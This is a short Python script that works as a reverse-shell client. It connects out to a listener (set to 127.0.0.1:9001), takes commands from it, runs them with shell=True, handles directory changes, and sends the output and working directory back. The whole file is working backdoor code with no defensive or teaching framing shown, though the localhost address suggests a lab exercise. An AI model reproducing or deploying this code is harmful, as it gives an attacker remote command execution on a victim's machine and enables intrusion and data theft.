import socket
import os
import subprocess


target_host = "127.0.0.1"
target_port = 9001


client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((target_host,target_port))


while True:
    data = client.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
        output_bytes = cmd.stdout.read()
        output_str = str(output_bytes, "utf-8")
        client.send(str.encode(output_str + str(os.getcwd()) + '$'))
        #print(output_str)

client.close()